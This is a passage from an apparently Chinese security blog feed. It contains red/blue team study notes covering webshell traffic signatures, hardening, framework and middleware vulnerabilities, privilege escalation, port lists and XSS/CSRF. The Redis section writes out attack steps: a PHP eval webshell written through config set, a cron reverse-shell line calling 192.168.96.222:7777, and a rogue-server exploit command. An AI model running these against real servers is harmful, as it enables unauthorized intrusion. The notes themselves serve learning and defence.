奇安信椒图）</p><p>安恒的明御apt攻击预警平台</p><blockquote><ol><li>外部威胁监测</li><li>脆弱性监测</li><li>攻击取证溯源分析</li><li>感知安全威胁趋势规律</li><li>资产发现与管理</li></ol></blockquote><p>（apt攻击：高级长期威胁advanced persistent threat，又称高级持续性威胁、先进持续性威胁等，是指<strong>隐匿而持久的电脑入侵过程，通常由某些人员精心策划，针对特定的目标</strong>）</p><p>奇安信天擎终端安全管理系统、奇安信网神态势感知与安全运营平台NGSOC</p><p>堡垒机 jumpserver</p><blockquote><p>身份验证 Authentication</p><p>账号管理 Account</p><p>授权控制 Authorization</p><p>安全审计 Audit</p></blockquote><p>针对内部运维人员的运维安全审计系统。主要功能是对运维人员的运维操作进行审计和权限控制(比如要登录某些平台或者系统只能通过堡垒机才可以，不用堡垒机是无法访问的)。同时堡垒机还有账号集中管理、单点登录(在堡垒机上登录即可实现对多个其他平台的无密登录)等功能</p><p>蜜罐：   微步的Hfish</p><h4 id="防守策略"><a href="#防守策略" class="headerlink" title="防守策略"></a>防守策略</h4><p><strong>策略收紧常态化</strong></p><p>联系现有设备的厂商将现有的安全设备策略进行调整，将访问控制策略收紧，数据库、系统组件等进行加固</p><p><strong>减少攻击暴露面</strong></p><p>暴露在互联网上的资产，并于能在互联网中查到的现网信息进行清除</p><p><strong>各种口令复杂化</strong></p><p>不论是操作系统、业务入口，还是数据库、中间件，甚至于主机，凡是需要口令认证的都将口令复杂化设置</p><p><strong>核心业务白名单</strong></p><p>将核心业务系统及重要业务系统做好初始化的工作，记录业务正常产生的流量，实施白名单策略</p><p><strong>主机系统打补丁</strong></p><p>对业务系统做基线核查，将不符合标准的项进行整改，并对业务系统做漏洞检查，并对找出的脆弱想进行整改</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230317214638041.png" alt="image-20230317214638041" style="zoom:50%;" /><h4 id="常用shell工具及流量特征"><a href="#常用shell工具及流量特征" class="headerlink" title="常用shell工具及流量特征"></a>常用shell工具及流量特征</h4><p><strong>菜刀</strong></p><p>菜刀<code> webshell</code> 只使用了 <code>url</code> 编码 + base64 编码<br>shell 特征就是存在<code>eval</code> <code>base64</code>等特征字符，传输参数名为 z0，存在一段以QG开头，7J结尾的固定base64代码。还存在<code>int_set(&quot;display_errors&quot;,&quot;0&quot;)</code>字符串特征</p><p><strong>蚁剑</strong></p><p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码，其流量中也存在和菜刀一样的代码</p><p>数据中含有<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>    header中含有<code>antsword</code>字眼</p><p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息<br>第二次请求，会把主机目录列出来</p><p><strong>冰蝎</strong></p><p>冰蝎2.0</p><p>使用 aes 加密发起三次请求<br>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的<br>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p><p>冰蝎3.0</p><p>使用 aes 加密发起两次请求<br>3.0 相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key, 改为取连接密码的md5加密值的前16位作为密钥<br>一次请求为判断是否可以建立连接，少了两次get获取冰蝎动态密钥的行为，第二次发送<code>phpinfo</code>等代码执行，获取网站的信息</p><p>cookie中带JSESSIONID和path&#x3D;&#x2F; ，请求包中的conten-length字段是5740或者5720</p><p><strong>哥斯拉</strong></p><p>支持 n 种加密<br>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p><blockquote><p>在响应包的cache-control字段中有no-store，no-cache等特征</p><p>所有请求中的cookie字段最后面都存在；特征</p><p>哥斯拉在执行命令的过程中存在三个组合的父子进程，也可以类似冰蝎一样检测恶意进程</p></blockquote><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p><strong>内网渗透思路</strong></p><ol><li>代理穿透</li><li>权限维持</li><li>内网信息收集</li><li>口令爆破</li><li>凭据窃取</li><li>社工</li><li>横行和纵向渗透</li><li>拿下域控</li></ol><p><strong>查看域信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all                        //查询一下本机的一些情况，IP段 网关 属于不属于域</span><br><span class="line">nei view /domain                     //查询有几个域, 查询域列表</span><br><span class="line">net group /domain                    //获得所有域用户组列表</span><br><span class="line">net user /domain                     //获得所有域用户列表</span><br></pre></td></tr></table></figure><h4 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h4><p>账户安全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">设置登录时不显示上次登录的用户名，防止弱口令爆破</span><br><span class="line">设置账户锁定策略，比如说登录行为限制次数，达到次数后锁定多长时间</span><br><span class="line">linux</span><br><span class="line">禁用root之外的超级用户   使用password  -l   &lt;用户名&gt;命令来锁定用户   -u解锁</span><br><span class="line">限制普通用户使用sudo提权，或者说限制提权的权限大小</span><br><span class="line">锁定系统中多余的自建账号</span><br><span class="line">设置账户锁定登录失败锁定次数，锁定时间   faillog   -u   &lt;用户名&gt;命令来解锁用户</span><br></pre></td></tr></table></figure><p>口令安全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">设置密码必须符合复杂性要求，比如设置时数字，大写字母，小写字母，特殊字符都要具备</span><br><span class="line">设置最小密码长度不能为0，设置不能使用历史密码</span><br><span class="line">linux</span><br><span class="line">检查shadow中空口令账号，修改口令复杂度，设置密码有效期vim  /etc/login.def命令</span><br></pre></td></tr></table></figure><p>服务与端口收敛</p><blockquote><p>关闭或者限制常见的高危端口，比如说22端口(SSH)，23端口(Telnet)，3389端口(RDP) </p><p>compmgmt.msc排查计划任务</p><p>linux上iptables封禁IP或者限制端口</p></blockquote><p>文件权限管理</p><blockquote><p>linux上chmod修改文件权限</p><p>chattr重要文件设置不可修改权限</p></blockquote><p>系统日志审计</p><blockquote><p>linux上设置系统日志策略配置文件 </p><p>系统日志 &#x2F;var&#x2F;log&#x2F;message </p><p>cron日志&#x2F;var&#x2F;log&#x2F;cron </p><p>安全日志&#x2F;var&#x2F;log&#x2F;secure</p></blockquote><p>设备和网络控制</p><blockquote><p>比如在涉密计算机上禁止访问外网，为了避免用户绕过策略可以禁止用户修改IP </p><p>删除默认路由配置，避免利用默认路由探测网络 </p><p>禁止使用USB设备比如U盘 </p><p>禁止ping命令，即禁用ICMP协议访问，不让外部ping通服务器</p></blockquote><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><p><strong>内存马原理</strong></p><p>我通过自身的理解，概述的说一下， 内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码</p><p>内存马是无文件Webshell，什么是无文件webshell呢？简单来说，就是服务器上不会存在需要链接的webshell脚本文件。那有的同学可能会问了？这种方式为什么能链接呢？内存马的原理就像是MVC架构，即通过路由访问控制器</p><p><strong>内存马如何查杀</strong></p><p>重启&#x2F;关机，内存马就掉了</p><h4 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h4><p>log4j远程代码执行漏洞</p><p>原理：</p><p>Log4j 是Apache 的一个开源项目，是一款基于Java 的开源日志记录工具。该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p><p>具体操作：</p><p>在正常的log处理过程中对**${**这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行    </p><p><code>Fastjson</code>反序列化漏洞</p><p>判断：</p><p>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断</p><p>原理：</p><p>fastjson是阿里巴巴开发的一款将json字符串和java对象进行序列化和反序列化的开源json解析库。fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题</p><p>无回显怎么办：</p><p>1.一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</p><p>2.通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</p><p>3.直接将命令执行结果回显到请求poc的HTTP响应中</p><p>Shiro反序列化漏洞</p><p>原理：</p><p>Shiro是Apache下的一个开源Java安全框架，执行身份认证，授权，密码和会话管理。shiro在用户登录时除了账号密码外还提供了可传递选项remember me。用户在登录时如果勾选了remember me选项，那么在下一次登录时浏览器会携带cookie中的remember me字段发起请求，就不需要重新输入用户名和密码</p><p>判断：</p><p>1.数据返回包中包含rememberMe&#x3D;deleteMe字段</p><p>2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：rememberMe&#x3D;然后查看返回数据包中是否存在关键字</p><p>shiro-550：</p><p>shiro反序列化漏洞利用有两个关键点，首先是在shiro&lt;1.2.4时，AES加密的密钥Key被硬编码在代码里，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据。另外就是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。攻击者构造恶意代码，并且序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行编码，解密并且反序列化，最终造成反序列化漏洞。</p><p>shiro-721：</p><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的Remember</p><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p><strong>IIS</strong></p><p>IIS6 解析漏洞</p><p>基于文件名，该版本默认会将 <em><strong>.asp;.jpg</strong> 此种格式的文件名，当成asp解析，原理是</em>*服务器默认不解析 ; 号及其后面的内容**，相当于截断</p><p>防护</p><ol><li>限制上传目录执行权限，不允许执行脚本</li><li>不允许新建目录</li><li>上传的文件需经过重命名时间戳 + 随机数 + .jpg 等</li></ol><p><strong>Apache</strong></p><p>AddHandler导致的解析漏洞， 如果运维人员给 .php 后缀增加了处理器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php.php </span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件名中含有 .php 后缀，即被识别成PHP文件，没必要是最后一个后缀<br>防护同上 IIS6</p><p>目录穿越漏洞</p><p><strong>Nginx</strong></p><p>配置文件错误导致的解析漏洞</p><ol><li><p>可以直接获取诸如 <code>index.php~  index.php.bak  </code>等文件</p></li><li><p>对于任意文件名，在后面添加  &#x2F;xxx.php（xxx为任意字符）后，即可将文件作为php解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxxx/a.png/a.php</span></span><br></pre></td></tr></table></figure></li></ol><p>防护</p><ol><li>匹配对应文件，rewrite返回404</li><li>配置 <code>cgi.fix_pathinfo(php.ini中)  </code>为0并重启 <code>php-cgi </code>程序</li></ol><p><strong>Tomcat</strong></p><p>Tomcat 任意文件写入（CVE-2017-12615）</p><p>windows+Tomcat 7.0.x+配置文件readonly&#x3D;false，导致我们可以往服务器写文件</p><p><strong>Weblogic</strong></p><p>任意文件上传漏洞（CVE-2018-2894）</p><p>通过截获上传的时间戳找出真正的文件名达到 poc</p><p><strong>JBOSS</strong></p><p>反序列化</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Linux提权</p><ol><li><p>Linux内核漏洞提权   脏牛Dirty COW  Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)</p></li><li><p>SUID提权（普通用户执行指令的标记）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查找SUID为root的指令</p></li><li><p>定时任务提权</p></li><li><p>环境变量劫持高权限程序</p></li><li><p>sudoer（用户组）配置文件错误提权</p></li><li><p>pkexec 本地权限提升漏洞(CVE-2021-4034)</p></li><li><p>NFS提权</p></li><li><p>Docker提权</p></li></ol><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">21 ftp        ftp的端口号20、21的区别一个是数据端口，一个是控制端口，控制端口一般为21</span><br><span class="line">69 TFTP       (简单文件传输协议) </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet</span><br><span class="line">80 web</span><br><span class="line">80-89 web</span><br><span class="line">443 https   SSL心脏滴血</span><br><span class="line">445 SMB     ms17-010永恒之蓝</span><br><span class="line">873 Rsync未授权</span><br><span class="line">1433 MSSQL</span><br><span class="line">1521 Oracle    </span><br><span class="line">3306 MySQL</span><br><span class="line">3389 远程桌面</span><br><span class="line">5432 PostgreSQL</span><br><span class="line">5900 vnc   目前常用的协议有VNC/SPICE/RDP三种 、小巧，支持客户端和服务器端的直接拷贝粘贴，缺点：速度最慢</span><br><span class="line">6379 redis未授权</span><br><span class="line">7001,7002  WebLogic默认弱口令，反序列</span><br><span class="line">8080  tomcat/WDCP主机管理系统，默认弱口令</span><br><span class="line">8080,8089,9090 JBOSS</span><br><span class="line">Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，默认端口是8080</span><br><span class="line">        在windows系统中：</span><br><span class="line">    1098、1099、4444、4445、8083端口在/jboss/server/default/conf/jboss-service.xml中</span><br><span class="line">    8080端口在/jboss/server/default/deploy/jboss-web.deployer/server.xml中</span><br><span class="line">    8093端口在/jboss/server/default/deploy/jms/uil2-service.xml中</span><br><span class="line">    8000-9090 都是一些常见的web端口</span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line">28017 mongodb统计页面</span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"></span><br><span class="line">161 SNMP</span><br><span class="line">389 LDAP</span><br><span class="line">512,513,514 Rexec</span><br><span class="line">1025,111 NFS</span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多）</span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3312/3311 kangle主机管理系统登陆</span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/</span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">7778 Kloxo主机控制面板登录</span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多）</span><br><span class="line">8649 ganglia</span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口</span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">11211 memcache未授权访问</span><br><span class="line">50000 SAP命令执行</span><br></pre></td></tr></table></figure><h4 id="如何检测挖矿病毒"><a href="#如何检测挖矿病毒" class="headerlink" title="如何检测挖矿病毒"></a>如何检测挖矿病毒</h4><p>检查数据包中 tcp 连接的传递载荷，如果存在连续几个数据包中都符合 stratum 协议的 json 载荷特征，那么主机就存在挖矿</p><p>1、通过流量层面找到挖矿主机</p><ul><li>协议特征检测：挖矿协议具有特定的数据包类型，大概分成了两类，一类是登录包，一类是提交包，并且这两种包也有明显的特点；</li><li>文件检测：流量中还原文件，进行沙箱检测；</li><li>主机异常网络行为：攻击者为了实现利益最大化，感染的主机会开始横向移动攻击，如内网扫描、爆破等行为，从而感染更多的机器；</li><li>通过协议检测，只能覆盖明文通信的情况，但目前绝大多数矿池都支持了加密通信，所以能够在握手协议和证书两个层面来做一些事情。另外由于挖矿的特殊性，矿池的域名、证书是不会轻易进行变化的，并且矿池的具有聚集属性，即越大的矿池集合到的矿机越多，越能够保证收益的稳定性。所以也可以针对排名较为靠前的矿池进行域名和证书的收集，添加针对性的检测策略；</li></ul><p>2、通过主机层面判断挖矿主机</p><ul><li>感染主机后有明显的行为特征，主要包括高CPU 和 GPU 使用率、响应速度慢、 崩溃或频繁重新启动、系统过热、异常网络活动（比如连接挖矿相关的域名或 IP）</li><li>主机层面的检测一般会从进程特征，网络连接，文件特征等多个维度进行检测</li></ul><p>3、威胁情报</p><p>通常活跃的挖矿木马都是有明显的家族特征和几个固定版本，可以通过威胁情报关联检测</p><h4 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h4><p>redis是非关系型数据库，默认端口6379</p><p>利用手段主要有：</p><p>1.向root权限账户写入ssh公钥文件，直接免密登录服务器 (受害者redis非root权限运行会报错)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">服务器存在.<span class="property">ssh</span>目录且具有写入的权限 (redis可以创建文件但无法创建目录，所以redis待写入文件所在的目录必须事先存在。 .<span class="property">ssh</span>目录默认没有,需要生成公、私钥或者建立ssh连接时才会生成)</span><br><span class="line">原理：</span><br><span class="line">在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.<span class="property">ssh</span>和默认的缓冲文件authorized.<span class="property">keys</span>，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.<span class="property">ssh</span>下生成一个授权的key</span><br></pre></td></tr></table></figure><p>2.写入webshell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">条件： 已知web绝对路径</span><br><span class="line">步骤：</span><br><span class="line"><span class="number">1.</span>  redis  -cli   -h   <span class="number">192.168</span>.<span class="property">x</span>.<span class="property">x</span>     连接目标服务器</span><br><span class="line"><span class="number">2.</span>  config set dir  <span class="string">&quot;/var/www/html&quot;</span>    设置保存文件路径</span><br><span class="line"><span class="number">3.</span>  config  set dbfilename  shell.<span class="property">php</span>  设置保存文件名</span><br><span class="line"><span class="number">4.</span>  set x  <span class="string">&quot;\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;\n&quot;</span>   将webshell写入x键值中</span><br><span class="line"><span class="number">5.</span>  save    保存</span><br><span class="line">局限：</span><br><span class="line"><span class="number">1.</span>服务器处于内网，写入webshell后我们的公网<span class="variable constant_">IP</span>无法连接</span><br><span class="line"><span class="number">2.</span>服务器<span class="variable constant_">IP</span>地址不固定</span><br><span class="line"><span class="number">3.6379</span>端口不允许入方向</span><br><span class="line"><span class="number">4.</span>上传webshell可能直接被杀毒软件删除</span><br></pre></td></tr></table></figure><p> 3.定时任务反弹shell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">定时任务用的表达式 ：<span class="title class_">Cron</span>表达式是一个字符串，该字符串由<span class="number">6</span>个空格分为<span class="number">7</span>个域，每一个域代表一个时间含义。分 时 天 月 周    user-<span class="title function_">name</span>(用户) <span class="title function_">command</span>(命令) 比如每过一分钟向root用户的定时任务中写入反弹连接命令</span><br><span class="line">(<span class="number">1</span>) config set dir /<span class="keyword">var</span>/spool/cron/              <span class="comment">//目录切换到定时任务的文件夹中</span></span><br><span class="line">(<span class="number">2</span>) config set dbfilename root                 <span class="comment">//设置保存文件名</span></span><br><span class="line">(<span class="number">3</span>)set x  <span class="string">&quot;\n  *  *  * *  * bash -i &gt;&amp; /dev/tcp/192.168.96.222/7777 0&gt;&amp;1\n&quot;</span> <span class="comment">//将反弹shell写入x键值中</span></span><br><span class="line">(<span class="number">4</span>)save    <span class="comment">//保存</span></span><br></pre></td></tr></table></figure><p>利用定时任务反弹shell在目标系统是Centos上可用，Ubuntu上有限制</p><p>理由如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>默认redis写文件后是<span class="number">644</span>的权限，但ubuntu要求执行定时任务件/<span class="keyword">var</span>/spool/cron/crontabs/权限必须是<span class="number">600</span>也就是-rw-----才会执行，否则会报错，而<span class="title class_">Centos</span>的定时任务文件权限<span class="number">644</span>也能执行</span><br><span class="line"><span class="number">2.</span>redis保存<span class="variable constant_">RDB</span>会存在乱码，在<span class="title class_">Ubuntu</span>上会报错，而在<span class="title class_">Centos</span>上不会报错</span><br><span class="line"><span class="number">3.</span>两个系统的定时任务文件目录不同</span><br></pre></td></tr></table></figure><p>4.主从复制getshell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">数据读写体量很大时，为了减轻服务器的压力，redis提供了主从模式，主从模式就是指定一个redis实例作为主机，其余的作为从机，其中主机和从机的数据是相同的，而从机只负责读，主机只负责写。通过读写分离可以减轻服务器端的压力</span><br><span class="line"></span><br><span class="line">条件：     版本(<span class="number">4.</span>x~<span class="number">5.0</span><span class="number">.5</span>)</span><br><span class="line">利用工具： <span class="title class_">RedisRogueServer</span>   地址：<span class="attr">https</span>:<span class="comment">//github.com/n0b0dyCN/redis-rogue-server</span></span><br><span class="line">使用工具的命令： python3   redis-rogue-server.<span class="property">py</span>   --rhost=x.<span class="property">x</span>.<span class="property">x</span>.<span class="property">x</span>   --lhost=x.<span class="property">x</span>.<span class="property">x</span>.<span class="property">x</span>   --exp=exp.<span class="property">so</span></span><br><span class="line">两种使用方法：  交互式   反弹式</span><br><span class="line">限制：  利用这个方法getshell或者rce任意导致redis服务瘫痪，一般不建议使用</span><br></pre></td></tr></table></figure><p>redis未授权访问漏洞的防范措施：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>添加登录密码</span><br><span class="line"><span class="number">2.</span>修改默认端口</span><br><span class="line"><span class="number">3.</span>关闭端口</span><br><span class="line"><span class="number">4.</span>禁止以root用户权限启动，以低权限启动redis服务</span><br></pre></td></tr></table></figure><h4 id="xss和csrf"><a href="#xss和csrf" class="headerlink" title="xss和csrf"></a>xss和csrf</h4><p>XSS：跨站脚本攻击（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。<strong>这类攻击通常包含了HTML以及用户端脚本语言</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 反射型：发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS</span><br><span class="line">b.存储型：存储型XSS和反射型XSS的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交XSS代码</span><br><span class="line">c.DOM型：DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的，单纯的在前端解析，没有经过后端，属于前端自身的安全漏洞</span><br></pre></td></tr></table></figure><p>防御：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.在表单提交或者url参数传递前，对需要的参数进行过滤</span><br><span class="line">2.对字符实体进行转义</span><br><span class="line">  htmlspecialchars() 函数,用于转义处理在页面上显示的文本</span><br><span class="line">  strip_tags() 函数,过滤掉输入、输出里面的恶意标签</span><br><span class="line">3.httponly（禁止JavaScript读取Cookie值，不过在用户与服务端交互的时候，HttpRequest包中仍然会带上这个Cookie信息，  即用户与服务端的正常交互不受影响）</span><br><span class="line">4.浏览器与Web应用端采用相同的字符编码</span><br></pre></td></tr></table></figure><p>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制<strong>用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</strong></p><p>（1）登录受信任网站A，并在本地生成Cookie（如果用户没有登录网站A，那么网站B在诱导的时候，请求网站A的api接口时，会提示你登录）<br>（2）在不登出A的情况下，访问危险网站B（其实是利用了网站A的漏洞）<br>注意cookie保证了用户可以处于登录状态，但网站B其实拿不到cookie</p><p>防御：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httponly</span><br><span class="line">token验证</span><br><span class="line">Referer验证：只有是本站的请求，服务器才做响应，如果不是就拦截</span><br><span class="line">再次输入密码</span><br></pre></td></tr></table></figure><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>1、CSRF是跨站请求伪造;  XSS是跨域脚本攻击<br>2、CSRF需要用户先登录网站A,获取cookie;  XSS不需要登录<br>3、CSRF是利用网站A本身的漏洞, 去请求网站A的api;  XSS是向网站A注入JS代码,然后执行JS里的代码,篡改网站A的内容（XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>）</p><p>4、CSRF攻击的范围有限，仅限于用户可以执行的操作，例如点击恶意链接或访问黑客的网站。相反，XSS攻击提供执行恶意脚本来执行攻击者所选择的任何活动，从而扩大了攻击的范围。</p><p>5、在XSS攻击中，恶意代码存储在站点中，而在CSRF攻击中，恶意代码存储在受害用户访问的第三方站点中</p><p>SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p><h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><p>http  file协议</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;红蓝对抗&quot;&gt;&lt;a href=&quot;#红蓝对抗&quot; class=&quot;headerlink&quot; title=&quot;红蓝对抗&quot;&gt;&lt;/a&gt;红蓝对抗&lt;/h4&gt;&lt;h5 id=&quot;蓝队组成&quot;&gt;&lt;a href=&quot;#蓝队组成&quot; class=&quot;headerlink&quot; title=&quot;蓝队组成&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://micgo.top/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="红蓝对抗" scheme="https://micgo.top/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化——CC3链</title>
    <link href="https://micgo.top/java-security/CC3/"/>
    <id>https://micgo.top/java-security/CC3/</id>
    <published>2023-03-12T16:00:00.000Z</published>
    <updated>2023-03-19T14:19:31.864Z</updated>
    
